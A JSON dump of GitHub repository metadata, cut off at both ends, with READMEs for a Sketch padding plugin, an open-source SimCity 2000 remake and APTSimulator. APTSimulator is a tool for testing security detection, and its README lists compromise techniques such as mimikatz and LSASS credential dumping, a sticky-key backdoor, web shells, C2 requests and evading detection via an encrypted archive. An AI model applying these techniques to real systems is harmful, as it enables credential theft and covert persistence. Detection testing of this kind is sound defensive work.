Components.","subscribersCount":{"totalCount":6},"diskUsage":409,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":1},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":2},"commits":{"totalCount":1}}}]},"issuesOpen":{"totalCount":4},"issuesClosed":{"totalCount":1},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}}]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}}]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":6}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"organization"},"siteAdmin":"false"},{"organization":{"login":"NextronSystems","repositories":{"totalCount":1},"location":"Frankfurt, Germany","members":{"totalCount":0},"websiteUrl":"https://www.nextron-systems.com/"},"repository":{"name":"APTSimulator","primaryLanguage":{"name":"Java"},"license":null,"isArchived":false,"hasWikiEnabled":true,"forkCount":48,"readme_md":{"text":"# APT Simulator\n\nAPT Simulator is a Windows Batch script that uses a set of tools and output files to make a system look as if it was compromised\n\n# Use Cases\n\n1. POCs: Endpoint detection agents / compromise assessment tools\n2. Test your security monitoring's detection capabilities \n3. Test your SOCs response on a threat that isn't EICAR or a port scan\n4. Prepare an environment for digital forensics classes\n\n# Motives\n\nCustomers tested our scanners in a POC and sent us a complaint that our scanners didn't report on programs that they had installed on their test systems. They had installed an Nmap, dropped a PsExec.exe in the Downloads folder and placed on EICAR test virus on the user's Desktop. That was the moment when I decided to build a tool that simulates a real threat in a more appropriate way.  \n\n# Why Batch?\n\n- Because it's simple: Everyone can read, modify or extend it\n- It runs on every Windows system without any prerequisites\n- It is closest to a real attacker working on the command line\n\n# Focus\n\nThe focus of this tool is to simulate adversary activity, not malware. See the [Advanced Solutions](#advanced-solutions) section for advanced tools to simulate adversary and malware activity.\n\n![APT vs Malware](/screenshots/MalwareAPT.png)\n\n# Getting Started\n\n1. Download the latest release from the \"release\" section\n2. Extract the package on a demo system (Password: apt)\n3. Start a cmd.exe as Administrator\n4. Navigate to the extracted program folder and run APTSimulator.bat\n\n# Avoiding Early Detection\n\nThe batch script extracts the tools and shells from an encrypted 7z archive at runtime. Do not download the master repo using the \"download as ZIP\" button. Instead use the official release from the [release](https://github.com/Neo23x0/APTSimulator/releases) section.\n\n# Extending the Test Set\n\nSince version 0.4 it is pretty easy to extend the test sets by adding a single `.bat` file to one of the test-set category folders. \n\nE.g. If you want to write a simple use case for \"privilege escalation\", that uses a tool named \"privesc.exe\", clone the repo and do the following:\n\n1. Add you tool to the `toolset` folder\n2. Write a new batch script `privesc-1.bat` and add it to the `./test-sets/privilege-escalation` folder\n3. Run `build_pack.bat`\n4. Add your test to the table and action list in the README.md\n5. Create a pull request\n\n## Tool and File Extraction\n\nIf you script includes a tool, web shell, auxiliary or output file, place them in the folders `./toolset` or `./workfiles`. Running the build script `build_pack.bat` will include them in the encrypted archives `enc-toolset.7z` and `enc-files.7z`.\n\n### Extract a Tool \n\n```\n\"%ZIP%\" e -p%PASS% %TOOLARCH% -aoa -o%APTDIR% toolset\\tool.exe > NUL\n```\n\n### Extract a File\n\n```\n\"%ZIP%\" e -p%PASS% %FILEARCH% -aoa -o%APTDIR% workfile\\tool-output.txt > NUL\n```\n\n# Detection \n\nThe following table shows the different test cases and the expected detection results.\n\n- AV = Antivirus\n- NIDS = Network Intrusion Detection System\n- EDR = Endpoint Detection and Response\n- SM = Security Monitoring\n- CA = Compromise Assessment\n\n| Test Case                             | AV  | NIDS | EDR | SM  | CA  |\n|---------------------------------------|-----|------|-----|-----|-----|\n| Dumps (Pwdump, Dir Listing)           |     |      |     |     | X   |\n| Recon Activity (Typical Commands)     |     |      | X   | X   | X   |\n| DNS (Cache Injection)                 | (X) | X    |     | X   | X   |\n| Eventlog (WCE entries)                |     |      | X   | X   | X   |\n| Hosts File (AV/Win Update blocks)     | (X) |      | X   |     | X   |\n| Backdoor (StickyKey file/debugger)    |     |      | X   |     | X   |\n| Obfuscation (RAR with JPG ext)        |     |      |     |     | (X) |\n| Web Shells (a good selection)         | X   |      | (X) |     | X   |\n| Ncat Alternative (Drop & Exec)        | X   |      | X   | X   | X   |\n| Remote Execution Tool (Drop)          | (X) |      |     |     | X   |\n| Mimikatz (Drop & Exec)                | X   |      | X   | X   | X   |\n| PsExec (Drop & Exec)                  |     |      | X   | X   | X   |\n| At Job Creation                       |     |      | X   | X   | X   |\n| RUN Key Entry Creation                |     |      | X   | X   | X   |\n| System File in Susp Loc (Drop & Exec) |     |      | X   | X   | X   |\n| Guest User (Activation & Admin)       |     |      | X   | X   | X   |\n| LSASS Dump (with Procdump)            |     |      | X   | X   | X   |\n| C2 Requests                           | (X) | X    | X   | X   |     |\n| Malicious User Agent (Malware, RATs)  |     | X    | X   | X   |     |\n| Scheduled Task Creation               |     |      | X   | X   | X   |\n| Nbtscan Discovery (Scan & Output)     |     | X    | X   | (X) | X   |\n\n# Test Cases\n\n## 1. Dumps \n\n- drops pwdump output to the working dir\n- drops directory listing to the working dir\n\n## 2. Recon \n\n- Executes command used by attackers to get information about a target system\n\n## 3. DNS \n\n- Looks up several well-known C2 addresses to cause DNS requests and get the addresses into the local DNS cache\n\n## 4. Eventlog\n\n- Creates Windwows Eventlog entries that look as if WCE had been executed\n\n## 5. Hosts\n\n- Adds entries to the local hosts file (update blocker, entries caused by malware)\n\n## 6. Sticky Key Backdoor\n\n- Tries to replace sethc.exe with cmd.exe (a backup file is created)\n- Tries to register cmd.exe as debugger for sethc.exe\n\n## 7. Obfuscation\n\n- Drops a cloaked RAR file with JPG extension\n\n## 8. Web Shells\n\n- Creates a standard web root directory\n- Drops standard web shells to that diretory\n- Drops GIF obfuscated web shell to that diretory\n\n## 9. Ncat Alternative\n\n- Drops a PowerShell Ncat alternative to the working directory\n\n## 10. Remote Execution Tool\n\n- Drops a remote execution tool to the working directory\n\n## 11. Mimikatz \n\n- Dumps mimikatz output to working directory (fallback if other executions fail)\n- Run special version of mimikatz and dump output to working directory\n- Run Invoke-Mimikatz in memory (github download, reflection)\n\n## 12. PsExec \n\n- Dump a renamed version of PsExec to the working directory\n- Run PsExec to start a command line in LOCAL_SYSTEM context\n\n## 13. At Job\n\n- Creates an at job that runs mimikatz and dumps credentials to file\n\n## 14. RUN Key\n\n- Create a suspicious new RUN key entry that dumps \"net user\" output to a file\n\n## 15. System File Suspicious Location\n\n- Drops suspicious executable with system file name (svchost.exe) in %PUBLIC% folder\n- Runs that suspicious program in %PUBLIC% folder\n\n## 16. Guest User\n\n- Activates Guest user\n- Adds Guest user to the local administrators\n\n## 17. LSASS DUMP\n\n- Dumps LSASS process memory to a suspicious folder\n\n## 18. C2 Requests\n\n- Uses Curl to access well-known C2 servers\n\n## 19. Malicious User Agents\n\n- Uses malicious user agents to access web sites\n\n## 20. Scheduled Task Creation\n\n- Creates a scheduled task that runs mimikatz and dumps the output to a file\n\n## 21. Nbtscan Discovery\n\n- Scanning 3 private IP address class-C subnets and dumping the output to the working directory\n\n# Warning\n\nThis repo contains tools and executables that can harm your system's integrity and stability. Do only use them on non-productive test or demo systems.\n\n# Screenshots\n\n![Screen](/screenshots/apt-0.png)\n![Screen](/screenshots/apt-1.png)\n![Screen](/screenshots/apt-2.png)\n![Screen](/screenshots/apt-c2.png)\n\n# Advanced Solutions\n\nThe CALDERA automated adversary emulation system\n[https://github.com/mitre/caldera](https://github.com/mitre/caldera)\n\nInfection Monkey - An automated pentest tool\n[https://github.com/guardicore/monkey](https://github.com/guardicore/monkey)\n\nFlightsim - A utility to generate malicious network traffic and evaluate controls \n[https://github.com/alphasoc/flightsim](https://github.com/alphasoc/flightsim)\n\n# Integrated Projects / Software\n\n- [Mimikatz](https://github.com/gentilkiwi/mimikatz)\n- [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)\n- [PowerCat](https://github.com/besimorhino/powercat)\n- [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)\n- [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)\n- [7Zip](http://www.7-zip.org/download.html)\n- [curl](https://curl.haxx.se/)\n\n# Contact\n\nFollow and contact me on Twitter @cyb3rops\n","byteSize":8355},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":337},"createdAt":"2018-02-03T14:19:42Z","updatedAt":"2018-02-16T21:20:30Z","pushedAt":"2018-02-15T20:55:08Z","description":"A toolset to make a system look as if it was the victim of an APT attack","subscribersCount":{"totalCount":30},"diskUsage":8731,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":3},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}}]},"issuesOpen":{"totalCount":1},"issuesClosed":{"totalCount":0},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}}]},"iClosedCommentsParticipantsCount":{"edges":[]},"numBranches":{"totalCount":1},"numCommits":{"target":{"history":{"totalCount":34}}},"tags":{"totalCount":4},"releases":{"totalCount":4},"type":"organization"},"siteAdmin":"false"},{"user":{"login":"DWilliames","followers":{"totalCount":31},"repositories":{"totalCount":25},"following":{"totalCount":15},"location":"Melbourne, Australia","organizations":{"totalCount":0},"gists":{"edges":[{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}}],"totalCount":1},"websiteUrl":""},"repository":{"name":"paddy-sketch-plugin","primaryLanguage":{"name":"JavaScript"},"license":null,"isArchived":false,"hasWikiEnabled":true,"forkCount":9,"readme_md":{"text":"<a href=\"https://github.com/DWilliames/paddy-sketch-plugin/archive/master.zip\">\n  <img src=\".images/banner-new.svg\" alt=\"Paddy sketch plugin – automated padding and spacing for your Sketch layers\"/>\n</a>\n\n---\n\n<a href=\"#user-content-padding\">\n  <img src=\".images/link-padding.svg\" alt=\"Go to 'Layer padding'\" width=\"250\"/>\n</a>\n<a href=\"#user-content-applied\">\n  <img src=\".images/link-applied.svg\" alt=\"Go to 'Automatically applied'\" width=\"250\"/>\n</a>\n<a href=\"#user-content-symbols\">\n  <img src=\".images/link-symbols.svg\" alt=\"Go to 'Symbol support'\" width=\"250\"/>\n</a>\n<a href=\"#user-content-spacing\">\n  <img src=\".images/link-spacing.svg\" alt=\"Go to 'Spacing & distribution'\" width=\"250\"/>\n</a>\n<a href=\"#user-content-alignment\">\n  <img src=\".images/link-alignment.svg\" alt=\"Go to 'Auto alignment'\" width=\"250\"/>\n</a>\n\n---\n\n![Using Paddy](.images/GIFs/main.gif)\n\n<a href=\"https://github.com/DWilliames/paddy-sketch-plugin/archive/master.zip\">\n  <img height=\"40\" src=\".images/download.svg\" >\n</a>\n\nDouble click the downloaded file (*Paddy.sketchplugin*) to install it.\n\n---\n\n**If you are using this plugin, please 'star' this project**. It's a simple way for me to be able to see how many people are using this, and how much effort I need to put into improving it further.\n\nIf you ***love*** this plugin, why not shout me a coffee ☕️ via [PayPal](https://www.paypal.me/dtw/5) to share the love!\nIt will definitely help me to be able to support this plugin further.\n\n<a href=\"https://www.paypal.me/dtw/5\">\n  <img width=\"160\" height=\"41\" src=\".images/paypal-badge.png\" >\n</a>\n\nFollow [@davidwilliames](https://twitter.com/davidwilliames) on Twitter [![Twitter Follow](https://img.shields.io/twitter/follow/davidwilliames.svg?style=social&label=Follow)]()\n\n---\n\n## Why this plugin?\n\nThere are some similar plugins out there that do some of the features of this plugin, but none of them do all of it in the simple way I wanted them to.\n\n* **Automatic:** Most other plugins require a keyboard shortcut for them to be applied, or re-applied. This is all done automatically as you manipulate your layers; simply deselect everything, and will be updated.\n* **Visible properties:** It's easy to scan your layer list to see what padding / spacing is applied to your layers and groups; without the need to select them individually. This is because all the properties are set via the layer's name.\n* **No special data manipulation:** This simply resizes and moves your layers to optimal positions – it doesn't turn your groups into a special 'Stack group' or something; so other people or programs can read the Sketch file perfectly fine, without the need for this plugin too.\n* **Lightweight:** It just does a couple of core things – it's not bloated with a bunch of unused features.\n\n---\n\n<img id=\"padding\" src=\".images/feature-padding.svg\" alt=\"Layer padding\" height=\"60\"/>\n\nPadding can be applied to one 'Background' layer (either a shape layer or a Symbol) of a group. The 'Background' layer will automatically resize itself so that it surrounds all other layers within that group by a specified amount.\n\nSpecify the padding amount within the background layer's name between '**[**' and '**]**'. e.g. **`Background [10 20]`**. The format of the padding values should be in the same order as [CSS](https://www.w3schools.com/cssref/pr_padding.asp).\n\nExamples:\n* **`[20]`**\n  * all sides have a padding of `20`\n* **`[10 5]`**\n  * top and bottom padding are `10`\n  * left and right padding are `5`\n* **`[10 5 15]`**\n  * top padding is `10`\n  * right and left padding are `5`\n  * bottom padding is `15`\n* **`[10 5 15 20]`**\n  * top padding is `10`\n  * right padding is `5`\n  * bottom padding is `15`\n  * left padding is `20`\n\nRun the plugin command **'Apply padding to selection'** or **`Control + Alt + p`** to bring up an input field, to save padding to all your selected layers easier.\n\n![Padding example](.images/GIFs/padding.gif)\n\n\n### Ignoring specific layers\n\nTo ignore specific layers when the Background layer is calculating it's size based on the padding. Simply prefix the name of the layer you want to ignore with a '-'. e.g. **`-new badge`** would be ignored.\n\n![Padding example ignoring layer](.images/GIFs/padding-ignore-layer.gif)\n\n\n### Ignoring padding for specific edges\n\nIf you don't want to apply padding to the top, bottom, left or right; simply use an **'x'** instead of a number.\n\nE.g to set padding of 60 to the top and bottom, but ignore applying any padding on the left and right, the background layer's name would include **`[60 x]`**\n\n![Padding example ignoring width](.images/GIFs/padding-ignore-edge.gif)\n\n\n### More advanced sizing expressions\n\nYou can also specific maximum and minimum sizes alongside padding values, separated by a semi colon – **';'**. e.g. **`[20 10; width <= 50]`** would apply a max width of '50'.\n\n* For width use: `width` or `w`\n* For height use: `height` or `h`\n* Available operators: `>=`, `>`, `<`, `<=`, `=`\n\n**Example:** **`[20;h>=250]`** would apply padding of '20' in all directions, with a minimum height of '250'.\n![Padding example with minimum height](.images/GIFs/padding-min-height.gif)\n\n---\n\n<img id=\"applied\" src=\".images/feature-applied.svg\" alt=\"Automatically applied\" height=\"60\"/>\n\nIn order to resize the background layer to the specified padding, simply deselect all layers – or press **`esc`** on your keyboard to deselect layers automatically.\n\nThis will automatically update all paddings and spacing for the previously selected layers.\n\n---\n\n<img id=\"symbols\" src=\".images/feature-symbols.svg\" alt=\"Symbol support\" height=\"60\"/>\n\nA lot of time and effort has gone into making sure Paddy works with symbols as well. If a symbol contains a background layer with padding; the symbol instance will automatically resize so that the background layer has enough padding around its sibling layers.\n\n![Padding example resizing symbols](.images/GIFs/symbol-bubble.gif)\n\nThis works great for creating dynamically resizing buttons.\n\n![Padding example resizing symbols](.images/GIFs/symbol-button.gif)\n\nThis should work with Sketch Libraries too! (At least it seems to in my limited testing – fingers-crossed 🤞)\n\nThis does not manipulate elements within a symbol, it simply resizes the symbol to the best size to fit. Because of this, each symbol cannot contain more than one 'Background layer' with padding.\n\nFor best results, avoid applying padding in deeply nested groups within the symbol.\n\n---\n\n<img id=\"spacing\" src=\".images/feature-spacing.svg\" alt=\"Spacing & distribution\" height=\"60\"/>\n\nSimilar to Anima's Stacked layers or the Distributer plugin, you can also apply 'spacing' to any group, for it to automatically distribute all its children.\n\nTo set the spacing / distribution of the layers in a group, add the spacing properties within a **`[`** and **`]`**; similar to applying padding to a group.\n\n**Properties:** [*{Spacing}{direction}*]\n* **Spacing:** the amount of spacing e.g. '10', '4'\n* **Direction:**\n  * 'h' for horizontal\n  * 'v' for vertical\n\n\n#### Spacing / distribution examples\n* **`[10v]`** – spacing the elements vertically, with a spacing of 10\n* **`[5h]`** – spacing the elements horizontally, with a spacing of 5\n\nRun the plugin command **'Apply spacing to selection'** or **`Control + Alt + Command + p`** to bring up an input field, to save spacing to all your selected groups easier.\n\n![Spacing example](.images/GIFs/spacing.gif)\n\n---\n\n<img id=\"alignment\" src=\".images/feature-alignment.svg\" alt=\"Auto alignment\" height=\"60\"/>\n\nYou can also set the alignment for all the layers within a group — all of which will be automatically applied. 'Alignment' can be applied on a group by itself, or in conjunction with 'spacing'.\n\nSimilar to spacing / padding, it is by naming the group something specific, within **`[`** and **`]`**.\n\n**Properties:** [*{alignment}*] or [*{Spacing}{direction} {alignment}*]\n\n**Alignment**\n* 'l' / 'left' – align to the left\n* 'c' / 'center' – align in the center, horizontally\n* 'r' / 'right' – align to the right\n* 't' / 'top' – align on the top\n* 'm' / 'middle' – align in the middler, vertically\n* 'b' / 'bottom' – align on the bottom\n\n![Alignment example](.images/GIFs/alignment.gif)\n\n**Examples**\n* **`[left]`** – align all layers left\n* **`[10v c]`** – space all layers vertically with a spacing of 10, all centered horizontally\n* **`[5h b]`** – space all layers horizontally with a spacing of 5, all aligned at the bottom\n\n![Alignment with spacing example](.images/GIFs/spacing-alignment.gif)\n\n\n---\n\n## Contribute and report bugs\n\nThis plugin is in active development.\n\nPull requests are welcome and please submit bugs 🐛.\n\n## Contact\n\n* Email <david@williames.com>\n* Follow [@davidwilliames](https://twitter.com/davidwilliames) on Twitter\n\n[![Twitter Follow](https://img.shields.io/twitter/follow/davidwilliames.svg?style=social&label=Follow)]()\n\n---\n\nCheck out my other Sketch Plugins:\n* [📕 PDF Export](https://github.com/DWilliames/PDF-export-sketch-plugin)\n* [Google Sheets content sync](https://github.com/DWilliames/Google-sheets-content-sync-sketch-plugin)\n* [Nudge Resize](https://github.com/DWilliames/nudge-resize-sketch-plugin)\n* [Nudge Corner Radius](https://github.com/DWilliames/nudge-corner-radius-sketch-plugin)\n","byteSize":9300},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":506},"createdAt":"2018-02-03T01:05:47Z","updatedAt":"2018-02-17T07:53:12Z","pushedAt":"2018-02-16T05:51:32Z","description":"Automated padding, spacing and alignment for your Sketch layers","subscribersCount":{"totalCount":20},"diskUsage":4002,"pullRequestsOpen":{"totalCount":0},"pullRequestsClosed":{"totalCount":0},"pullRequestsMerged":{"totalCount":2},"PROpenCommentsCommitsCount":{"edges":[]},"PRClosedCommentsCommitsCount":{"edges":[]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":0},"commits":{"totalCount":4}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":6}}}]},"issuesOpen":{"totalCount":16},"issuesClosed":{"totalCount":9},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":4},"participants":{"totalCount":5}}},{"node":{"comments":{"totalCount":3},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":4},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":6},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":3},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":7},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":3},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}}]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":3},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":6},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":6},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":5},"participants":{"totalCount":4}}}]},"numBranches":{"totalCount":4},"numCommits":{"target":{"history":{"totalCount":14}}},"tags":{"totalCount":4},"releases":{"totalCount":3},"type":"user"},"siteAdmin":"false"},{"user":{"login":"rage8885","followers":{"totalCount":68},"repositories":{"totalCount":2},"following":{"totalCount":0},"location":"Chicago, IL","organizations":{"totalCount":0},"gists":{"edges":[],"totalCount":0},"websiteUrl":"http://rage8885.github.com"},"repository":{"name":"OpenSC2K","primaryLanguage":{"name":"JavaScript"},"license":"GNU General Public License v3.0","isArchived":false,"hasWikiEnabled":true,"forkCount":157,"readme_md":{"text":"# OpenSC2K\nOpenSC2K - An Open Source remake of SimCity 2000 written in JavaScript using HTML5 Canvas API, SQLite and built on [Electron](https://github.com/atom/electron).\n\n## Overview\nCurrently a lot remains to be implemented but the basic framework is there for importing and viewing cities. Lots of stuff remains completely unimplemented such as the actual simulation, rendering of many special case tiles and buildings, support for zoom levels and anything else that exists outside of importing and viewing.\n\nAlong with implementing the original functionality and features, I plan to add additional capabilities beyond the original such as larger city/map sizes, additional network types, adding buildings beyond the initial tileset limitations, action/history tracking along with replays and more.\n\n![Screenshot](/screenshots/1.png)\n\n## Installation\n\n### OS X\n1. `git clone https://github.com/rage8885/OpenSC2K` or download this repository\n1. `cd OpenSC2K`\n1. `npm install` downloads and installs the dependancies\n1. `npm start` to run\n\n### Windows\n1. `git clone https://github.com/rage8885/OpenSC2K` or download this repository\n1. `cd OpenSC2K`\n1. `npm install --global --production windows-build-tools` (as admin) installs Windows specific prerequisites\n1. `npm config set msvs_version 2015 --global` changes config to use correct version of msvs\n1. Close all shell/cmd windows and open a new one (non-admin) to reload npm config with correct version\n1. Navigate to the OpenSC2K directory\n1. `npm install` downloads and installs the dependencies\n1. `npm start` to run\n\n### Linux\n1. `git clone https://github.com/rage8885/OpenSC2K` or download this repository\n1. `cd OpenSC2K`\n1. `npm install` downloads and installs the dependencies\n1. `npm start` to run\n\n## Usage\nBy default, there is no saved city loaded - select a valid SimCity 2000 .sc2 saved game when the file open prompt appears. The city will be imported and saved within the SQLite database and prompt to reload. Right now, the last imported city will automatically load with no option to change cities. To import a new city, press `O` and the file open prompt should appear.\n\nAdditional Keys:\n - `O` to open a new .sc2 file for import\n - `Q` or `W` to rotate the camera left or right respectively.\n - `1` sets the current cursor tool to none\n - `2` sets the current cursor tool to \"center\" (center the map on click)\n - `3` sets the current cursor tool to \"info\" (displays tile info)\n - `0` clears the database (deletes all cities)\n - Arrow keys to move the camera around\n\n### Debug Overlays\nThese functions will toggle various debug overlays and views built in to the engine to assist with development. Many of these overlays negatively impact performance significantly.\n\n - `Z` toggles building key tile display (corners)\n - `C` toggles display of tile coordinates\n - `I` toggles display of a sequence number on each tile in the order of rendering\n - `X` toggles display of terrain layer\n - `V` toggles display of zones layer\n - `Y` toggles display of networks layer (roads, rails, powerlines, highways)\n - `B` toggles display of buildings\n - `N` toggles display of water\n - `M` toggles display of terrain edge blocks\n - `H` toggles display of terrain height map\n - `K` toggles an overlay on top of zones\n - `J` toggles an overlay on top of networks\n - `T` toggles the clip boundary debug view (and sets the clipping box to 200px away from the window border)\n - `F5` to reload the application / re-initialize\n\n![Screenshot](/screenshots/2.png)\n![Screenshot](/screenshots/3.png)\n\n## Acknowledgements\nUsing sc2kparser created by Objelisks distributed under the terms of the ISC license.\n<https://github.com/Objelisks/sc2kparser>\n\nBased on the work of Dale Floer\n - SimCity 2000 specifications (*.sc2)\n - MIF / LARGE.DAT graphics extraction\n\nBased on the work of David Moews\n - SimCity 2000 for MS-DOS file format; unofficial partial information <http://djm.cc/dmoews.html>\n\n## License\nOpenSC2K - An Open Source SimCity 2000 remake\n\nCopyright (C) 2018 Nicholas Ochoa\n\nThis program is free software: you can redistribute it and/or modify\nit under the terms of the GNU General Public License as published by\nthe Free Software Foundation, either version 3 of the License, or\n(at your option) any later version.\n\nThis program is distributed in the hope that it will be useful,\nbut WITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\nGNU General Public License for more details.\n\nYou should have received a copy of the GNU General Public License\nalong with this program.  If not, see <http://www.gnu.org/licenses/>.\n\nIncludes assets and graphics extracted from the original SimCity 2000 Special Edition CD. These assets are NOT covered by the GNU General Public License used by this project and are copyright EA / Maxis. I'm including these assets in the hope that because the game has been made freely available at various points in time by EA, and because it's 24 years old as of publishing this project that no action will be taken. Long story short, please don't sue me! Long term, I plan to add functionality to extract assets from the original game files within this project.\n","byteSize":5212},"readme_txt":null,"readme_markdown":null,"readme_tst":null,"readme_":null,"stars":{"totalCount":3791},"createdAt":"2018-02-03T02:38:07Z","updatedAt":"2018-02-17T07:59:00Z","pushedAt":"2018-02-13T23:17:12Z","description":"OpenSC2K - An Open Source remake of Sim City 2000 by Maxis","subscribersCount":{"totalCount":148},"diskUsage":26494,"pullRequestsOpen":{"totalCount":3},"pullRequestsClosed":{"totalCount":1},"pullRequestsMerged":{"totalCount":6},"PROpenCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":4}}},{"node":{"comments":{"totalCount":5},"commits":{"totalCount":2}}}]},"PRClosedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":2},"commits":{"totalCount":1}}}]},"PRMergedCommentsCommitsCount":{"edges":[{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":1},"commits":{"totalCount":1}}},{"node":{"comments":{"totalCount":3},"commits":{"totalCount":1}}}]},"issuesOpen":{"totalCount":19},"issuesClosed":{"totalCount":11},"iOpenCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":3},"participants":{"totalCount":4}}},{"node":{"comments":{"totalCount":5},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":11},"participants":{"totalCount":6}}},{"node":{"comments":{"totalCount":10},"participants":{"totalCount":8}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":7},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":3},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":9},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":1},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}}]},"iClosedCommentsParticipantsCount":{"edges":[{"node":{"comments":{"totalCount":5},"participants":{"totalCount":5}}},{"node":{"comments":{"totalCount":6},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":3},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":3}}},{"node":{"comments":{"totalCount":3},"participants":{"totalCount":4}}},{"node":{"comments":{"totalCount":20},"participants":{"totalCount":4}}},{"node":{"comments":{"totalCount":4},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":2},"participants":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"participants":{"totalCount":1}}}]},"numBranches":{"totalCount":2},"numCommits":{"target":{"history":{"totalCount":29}}},"tags":{"totalCount":0},"releases":{"totalCount":0},"type":"user"},"siteAdmin":"false"},{"user":{"login":"rgov","followers":{"totalCount":58},"repositories":{"totalCount":48},"following":{"totalCount":59},"location":"California","organizations":{"totalCount":1},"gists":{"edges":[{"node":{"comments":{"totalCount":2},"stargazers":{"totalCount":6}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":2}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":1}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"totalCount":0},"stargazers":{"totalCount":0}}},{"node":{"comments":{"